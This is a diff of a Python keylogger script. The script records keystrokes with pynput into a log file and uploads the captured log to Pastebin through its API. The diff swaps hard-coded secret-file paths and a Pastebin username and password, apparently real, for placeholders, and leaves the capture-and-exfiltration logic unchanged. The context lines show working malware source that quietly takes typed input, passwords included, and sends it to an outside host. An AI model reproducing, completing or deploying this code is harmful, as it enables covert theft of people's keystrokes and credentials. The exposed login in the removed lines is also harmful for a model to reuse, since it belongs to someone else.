@@ -5,7 +5,7 @@ import threading
 from pynput import keyboard
 
 # Define the log file path
-LOG_FILE = os.path.join("Leak Creds", "secrets", "keylog.txt")
+LOG_FILE = os.path.join("path", "to", "keylog.txt")
 
 def on_press(key):
     """Handle key press events and log them to a file."""
@@ -57,7 +57,7 @@ def send_to_pastebin():
     """Send logged data to Pastebin."""
     try:
         # Read the dev key
-        with open(os.path.join("Leak Creds", "secrets", "dev_key"), 'r') as f:
+        with open(os.path.join("path", "to", "dev_key"), 'r') as f:
             key = f.read().strip()
     except FileNotFoundError:
         print("Dev key not found")
@@ -65,7 +65,7 @@ def send_to_pastebin():
 
     try:
         # Read the user key
-        with open(os.path.join("Leak Creds", "secrets", "user_key"), 'r') as f:
+        with open(os.path.join("path", "to", "user_key"), 'r') as f:
             user_key = f.read().strip()
     except FileNotFoundError:
         print("User key not found")
@@ -78,8 +78,8 @@ def send_to_pastebin():
 
         login_data = {
             'api_dev_key': key,
-            'api_user_name': 'payload_paradise',
-            'api_user_password': 'JDSG874Y834GYDSLHIVNZ',
+            'api_user_name': 'username', #username
+            'api_user_password': 'secure_pasword', #make sure it is secure
             'api_option': 'paste',
             'api_paste_code': file_contents,
             'api_paste_name': "keylog_data",
